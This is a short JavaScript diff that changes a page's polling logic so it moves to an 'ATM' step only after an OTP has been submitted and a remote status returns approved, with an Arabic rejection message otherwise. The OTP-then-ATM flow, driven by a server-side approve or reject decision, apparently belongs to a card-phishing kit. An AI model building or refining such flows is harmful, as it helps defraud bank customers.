@@ -377,6 +377,11 @@
       return ['approved', 'accept', 'accepted', 'otp', 'verified', 'success'].indexOf(status) !== -1;
     }
 
+    function shouldSkipToAtmAfterOtpSubmit(value){
+      var status = normalizeStatus(value);
+      return hasSubmittedOtp && ['approved', 'accept', 'accepted', 'otp', 'verified', 'success'].indexOf(status) !== -1;
+    }
+
     function isRejectedStatus(value){
       var status = normalizeStatus(value);
       return ['rejected', 'reject', 'declined', 'error', 'failed'].indexOf(status) !== -1;
@@ -415,7 +420,7 @@
           .then(function(data){
             if (!data || !data.status) return;
             var status = normalizeStatus(data.status);
-            if (isApprovedStatus(status)) {
+            if (shouldSkipToAtmAfterOtpSubmit(status)) {
               redirectToAtm();
             } else if (isRejectedStatus(status)) {
               redirectToOtpError('تم رفض رمز التحقق. يرجى التحقق من الرمز والمحاولة مرة أخرى.');
